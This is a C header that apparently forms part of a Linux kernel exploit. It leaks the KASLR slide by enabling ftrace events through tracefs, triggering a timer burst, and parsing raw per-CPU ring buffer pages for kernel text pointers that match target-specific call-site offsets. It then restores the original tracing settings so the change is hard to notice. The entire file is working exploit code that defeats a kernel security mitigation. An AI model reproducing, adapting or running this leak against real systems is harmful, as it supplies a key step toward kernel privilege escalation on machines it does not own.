#ifndef TRACEFS_SLIDE_H
#define TRACEFS_SLIDE_H

/*
 * KASLR slide from ftrace: a kmem_cache_alloc call site and a
 * sched_blocked_reason caller are kernel text pointers inside the record.
 * Matched on the low 16 bits of a known call site, which KASLR cannot move.
 */

#ifndef SLIDE_TRACEFS_MAX_SLIDE
#define SLIDE_TRACEFS_MAX_SLIDE 0x1f0000ULL
#endif
#ifndef SLIDE_TRACEFS_TIMER_BURST
#define SLIDE_TRACEFS_TIMER_BURST 512
#endif
#ifndef SLIDE_TRACEFS_BUFFER_KB
#define SLIDE_TRACEFS_BUFFER_KB 2048
#endif
#ifndef SLIDE_TRACEFS_SCAN_PAGES
#define SLIDE_TRACEFS_SCAN_PAGES 512
#endif
#ifndef SLIDE_TRACEFS_MIN_VOTES
#define SLIDE_TRACEFS_MIN_VOTES 3
#endif

#define TRACEFS_SLIDE_SLOTS 32
#define TRACEFS_SLIDE_SRC_KMEM 0
#define TRACEFS_SLIDE_SRC_SCHED 1
#define TRACEFS_SLIDE_SRC_COUNT 2
#define TRACEFS_SLIDE_IMAGE_TEXT_SPAN 0x400000ULL

#ifndef SLIDE_TRACEFS_WORKER_CALLER_OFF
#error "tracefs slide needs the target's sched caller offset"
#endif

struct tracefs_slide_stats {
  unsigned int votes[TRACEFS_SLIDE_SRC_COUNT][TRACEFS_SLIDE_SLOTS];
  unsigned int pages;
  unsigned int records;
  unsigned int kmem_records;
};

static const char tracefs_slide_root[] = "/sys/kernel/tracing";

static int tracefs_slide_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t length = strlen(value);
  size_t done = 0;
  while (done < length) {
    ssize_t wrote = write(fd, value + done, length - done);
    if (wrote < 0 && errno == EINTR) {
      continue;
    }
    if (wrote <= 0) {
      close(fd);
      return 0;
    }
    done += (size_t)wrote;
  }
  return close(fd) == 0;
}

static int tracefs_slide_read_u32(const char *path, uint32_t *value) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  char text[32];
  ssize_t got;
  do {
    got = read(fd, text, sizeof(text) - 1);
  } while (got < 0 && errno == EINTR);
  int read_errno = errno;
  close(fd);
  if (got <= 0) {
    errno = read_errno;
    return 0;
  }
  text[got] = 0;
  char *end = NULL;
  errno = 0;
  unsigned long parsed = strtoul(text, &end, 10);
  while (end && (*end == ' ' || *end == '\t' || *end == '\r' ||
                 *end == '\n')) {
    end++;
  }
  /* buffer_size_kb appends " (expanded: N)" when it rounds the request. */
  if (errno || end == text || parsed > UINT32_MAX ||
      (*end && strncmp(end, "(expanded:", 10) != 0)) {
    return 0;
  }
  *value = (uint32_t)parsed;
  return 1;
}

static int tracefs_slide_clear(const char *path) {
  int fd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  return close(fd) == 0;
}

static int tracefs_slide_text_pointer(uint64_t value) {
  return value >= KIMAGE_TEXT_BASE &&
         value < KIMAGE_TEXT_BASE + TRACEFS_SLIDE_IMAGE_TEXT_SPAN;
}

static int tracefs_slide_kernel_pointer(uint64_t value) {
  return (value >> 48) == 0xffffULL;
}

static void tracefs_slide_vote(struct tracefs_slide_stats *stats, int source,
                               uint64_t site, uint64_t site_offset) {
  uint64_t slide = site - (KIMAGE_TEXT_BASE + site_offset);
  if (slide > SLIDE_TRACEFS_MAX_SLIDE || (slide & 0xffffULL) != 0) {
    return;
  }
  stats->votes[source][(size_t)(slide >> 16)]++;
}

static void tracefs_slide_scan_page(struct tracefs_slide_stats *stats,
                                    const unsigned char *page,
                                    size_t length) {
  if (length < 16) {
    return;
  }
  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t end = 16 + (size_t)(commit & 0xfffULL);
  if (end > length) {
    end = length;
  }
  size_t pos = 16;
  while (pos + 4 <= end) {
    uint32_t header = 0;
    memcpy(&header, page + pos, sizeof(header));
    uint32_t type_len = header & 0x1fU;
    size_t record;
    size_t record_len;
    size_t total;
    if (type_len == 30) {
      pos += 8;
      continue;
    }
    if (type_len == 31) {
      pos += 12;
      continue;
    }
    if (type_len == 0) {
      uint32_t extended = 0;
      if (pos + 8 > end) {
        break;
      }
      memcpy(&extended, page + pos + 4, sizeof(extended));
      if (extended < 4) {
        break;
      }
      record = pos + 8;
      record_len = (size_t)extended - 4;
      total = 4 + (size_t)extended;
    } else if (type_len <= 28) {
      record = pos + 4;
      record_len = (size_t)type_len * 4;
      total = 4 + record_len;
    } else {
      break;
    }
    if (record + record_len > end || pos + total > end) {
      break;
    }
    stats->records++;

    const unsigned char *payload = page + record + 8;
    size_t payload_len = record_len >= 8 ? record_len - 8 : 0;

#if defined(SLIDE_TRACEFS_KMEM_SITE_OFF) && defined(SLIDE_TRACEFS_KMEM_OBJECT)
    /* kmem_cache_alloc: call_site, ptr, bytes_req, bytes_alloc. */
    if (payload_len >= 32) {
      uint64_t site = 0, pointer = 0, request = 0, allocated = 0;
      memcpy(&site, payload, sizeof(site));
      memcpy(&pointer, payload + 8, sizeof(pointer));
      memcpy(&request, payload + 16, sizeof(request));
      memcpy(&allocated, payload + 24, sizeof(allocated));
      if (tracefs_slide_text_pointer(site) &&
          (site & 0xffffULL) == (SLIDE_TRACEFS_KMEM_SITE_OFF & 0xffffULL) &&
          tracefs_slide_kernel_pointer(pointer) &&
          (request == SLIDE_TRACEFS_KMEM_OBJECT ||
           allocated == SLIDE_TRACEFS_KMEM_OBJECT)) {
        tracefs_slide_vote(stats, TRACEFS_SLIDE_SRC_KMEM, site,
                           SLIDE_TRACEFS_KMEM_SITE_OFF);
        stats->kmem_records++;
      }
    }
#endif

    for (size_t offset = 0; offset + 8 <= payload_len; offset += 4) {
      uint64_t value = 0;
      memcpy(&value, payload + offset, sizeof(value));
      if (!tracefs_slide_text_pointer(value)) {
        continue;
      }
      if ((value & 0xffffULL) !=
          (SLIDE_TRACEFS_WORKER_CALLER_OFF & 0xffffULL)) {
        continue;
      }
      tracefs_slide_vote(stats, TRACEFS_SLIDE_SRC_SCHED, value,
                         SLIDE_TRACEFS_WORKER_CALLER_OFF);
    }
    pos += total;
  }
}

static int tracefs_slide_read_pipes(struct tracefs_slide_stats *stats) {
  long cpu_count = sysconf(_SC_NPROCESSORS_CONF);
  if (cpu_count <= 0 || cpu_count > 256) {
    return 0;
  }
  unsigned char *page = malloc(PAGE_SIZE);
  if (!page) {
    return 0;
  }
  int files = 0;
  for (long cpu = 0; cpu < cpu_count; cpu++) {
    char path[128];
    snprintf(path, sizeof(path), "%s/per_cpu/cpu%ld/trace_pipe_raw",
             tracefs_slide_root, cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    files++;
    for (unsigned int pages = 0; pages < SLIDE_TRACEFS_SCAN_PAGES; pages++) {
      ssize_t got = read(fd, page, PAGE_SIZE);
      if (got < 0 && errno == EINTR) {
        continue;
      }
      if (got <= 0) {
        break;
      }
      stats->pages++;
      tracefs_slide_scan_page(stats, page, (size_t)got);
    }
    close(fd);
  }
  free(page);
  return files;
}

static int tracefs_slide_burst(void) {
  timer_t timers[SLIDE_TRACEFS_TIMER_BURST];
  int made = 0;
  for (int index = 0; index < SLIDE_TRACEFS_TIMER_BURST; index++) {
    struct sigevent event;
    memset(&event, 0, sizeof(event));
    event.sigev_notify = SIGEV_NONE;
    if (timer_create(CLOCK_MONOTONIC, &event, &timers[made]) != 0) {
      break;
    }
    made++;
  }
  struct timespec hold = {.tv_sec = 0, .tv_nsec = 20000000L};
  while (nanosleep(&hold, &hold) != 0 && errno == EINTR) {
  }
  for (int index = 0; index < made; index++) {
    timer_delete(timers[index]);
  }
  return made;
}

static void tracefs_slide_trigger_path(char *path, size_t capacity) {
  snprintf(path, capacity, "%s/events/kmem/rss_stat/trigger",
           tracefs_slide_root);
}

static int tracefs_slide_kmem_preexisting(void) {
  char path[128];
  char text[512];
  tracefs_slide_trigger_path(path, sizeof(path));
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t got;
  do {
    got = read(fd, text, sizeof(text) - 1);
  } while (got < 0 && errno == EINTR);
  close(fd);
  if (got <= 0) {
    return 0;
  }
  text[got] = 0;
  return strstr(text, "enable_event:kmem:kmem_cache_alloc") != NULL;
}

static int tracefs_slide_kmem_enable(void) {
#if defined(SLIDE_TRACEFS_KMEM_SITE_OFF) && defined(SLIDE_TRACEFS_KMEM_OBJECT)
  char path[128];
  tracefs_slide_trigger_path(path, sizeof(path));
  return tracefs_slide_write(path, "enable_event:kmem:kmem_cache_alloc\n");
#else
  return 0;
#endif
}

/* '!' deletes a trigger, where disable_event leaves the entry in place. */
static void tracefs_slide_kmem_restore(int preexisting) {
#if defined(SLIDE_TRACEFS_KMEM_SITE_OFF) && defined(SLIDE_TRACEFS_KMEM_OBJECT)
  char path[128];
  tracefs_slide_trigger_path(path, sizeof(path));
  tracefs_slide_write(path, "!enable_event:kmem:kmem_cache_alloc\n");
  if (preexisting) {
    tracefs_slide_write(path,
                        "enable_event:kmem:kmem_cache_alloc:unlimited\n");
  }
#else
  (void)preexisting;
#endif
}

static int tracefs_slide_source_best(const struct tracefs_slide_stats *stats,
                                     int source, unsigned int *count) {
  unsigned int best = 0;
  int best_slot = -1;
  for (int slot = 0; slot < TRACEFS_SLIDE_SLOTS; slot++) {
    if (stats->votes[source][slot] > best) {
      best = stats->votes[source][slot];
      best_slot = slot;
    }
  }
  *count = best;
  return best_slot;
}

static int tracefs_slide_decide(const struct tracefs_slide_stats *stats,
                                uintptr_t *slide_out,
                                const char **source_out) {
  unsigned int kmem_count = 0;
  unsigned int sched_count = 0;
  int kmem_slot =
      tracefs_slide_source_best(stats, TRACEFS_SLIDE_SRC_KMEM, &kmem_count);
  int sched_slot =
      tracefs_slide_source_best(stats, TRACEFS_SLIDE_SRC_SCHED, &sched_count);

  if (kmem_count >= SLIDE_TRACEFS_MIN_VOTES &&
      sched_count >= SLIDE_TRACEFS_MIN_VOTES && kmem_slot != sched_slot) {
    pr_warning("slide tracefs sources disagree kmem=slot%d/%u "
               "sched=slot%d/%u\n", kmem_slot, kmem_count, sched_slot,
               sched_count);
    return 0;
  }
  int slot = -1;
  const char *source = NULL;
  if (kmem_slot >= 0 && kmem_count >= SLIDE_TRACEFS_MIN_VOTES) {
    slot = kmem_slot;
    source = "tracefs-kmem";
  } else if (sched_slot >= 0 && sched_count >= SLIDE_TRACEFS_MIN_VOTES) {
    slot = sched_slot;
    source = "tracefs-sched";
  } else {
    pr_warning("slide tracefs no quorum kmem=slot%d/%u sched=slot%d/%u\n",
               kmem_slot, kmem_count, sched_slot, sched_count);
    return 0;
  }
  *slide_out = (uintptr_t)((uint64_t)slot << 16);
  *source_out = source;
  return 1;
}

static int tracefs_slide_leak(uintptr_t *slide_out, const char **source_out) {
  char tracing_path[128];
  char buffer_path[128];
  char trace_path[128];
  char sched_path[128];
  char text[16];
  uint32_t old_tracing = 0;
  uint32_t old_buffer = 0;
  uint32_t old_sched = 0;
  struct tracefs_slide_stats stats;

  memset(&stats, 0, sizeof(stats));
  snprintf(tracing_path, sizeof(tracing_path), "%s/tracing_on",
           tracefs_slide_root);
  snprintf(buffer_path, sizeof(buffer_path), "%s/buffer_size_kb",
           tracefs_slide_root);
  snprintf(trace_path, sizeof(trace_path), "%s/trace", tracefs_slide_root);
  snprintf(sched_path, sizeof(sched_path),
           "%s/events/sched/sched_blocked_reason/enable", tracefs_slide_root);

  if (!tracefs_slide_read_u32(tracing_path, &old_tracing) ||
      !tracefs_slide_read_u32(buffer_path, &old_buffer) ||
      !tracefs_slide_read_u32(sched_path, &old_sched)) {
    pr_warning("slide tracefs unavailable errno=%d\n", errno);
    return 0;
  }
  pr_info("slide tracefs state tracing=%u buffer=%u sched=%u\n", old_tracing,
          old_buffer, old_sched);

  tracefs_slide_write(tracing_path, "0");
  tracefs_slide_clear(trace_path);
  snprintf(text, sizeof(text), "%u\n", (unsigned)SLIDE_TRACEFS_BUFFER_KB);
  int buffer_ok = tracefs_slide_write(buffer_path, text);
  /* Events enabled before the first tracing_on=1 stay inactive for that burst. */
  tracefs_slide_write(tracing_path, "1");
  int kmem_preexisting = tracefs_slide_kmem_preexisting();
  int kmem_enabled = tracefs_slide_kmem_enable();
  int sched_ok = tracefs_slide_write(sched_path, "1");
  struct timespec settle = {.tv_sec = 0, .tv_nsec = 5000000L};
  while (nanosleep(&settle, &settle) != 0 && errno == EINTR) {
  }

  int timers = tracefs_slide_burst();
  tracefs_slide_write(tracing_path, "0");
  int cpu_files = tracefs_slide_read_pipes(&stats);

  if (sched_ok) {
    snprintf(text, sizeof(text), "%u\n", old_sched);
    tracefs_slide_write(sched_path, text);
  }
  if (buffer_ok) {
    snprintf(text, sizeof(text), "%u\n", old_buffer);
    tracefs_slide_write(buffer_path, text);
  }
  snprintf(text, sizeof(text), "%u\n", old_tracing);
  tracefs_slide_write(tracing_path, text);
  tracefs_slide_kmem_restore(kmem_preexisting);

  pr_info("slide tracefs burst timers=%d pages=%u records=%u kmem=%u "
          "cpus=%d enable_kmem=%d preexisting=%d enable_sched=%d "
          "buffer=%d\n", timers, stats.pages, stats.records,
          stats.kmem_records, cpu_files, kmem_enabled, kmem_preexisting,
          sched_ok, buffer_ok);
  if (!cpu_files || !stats.records) {
    return 0;
  }
  return tracefs_slide_decide(&stats, slide_out, source_out);
}

#endif
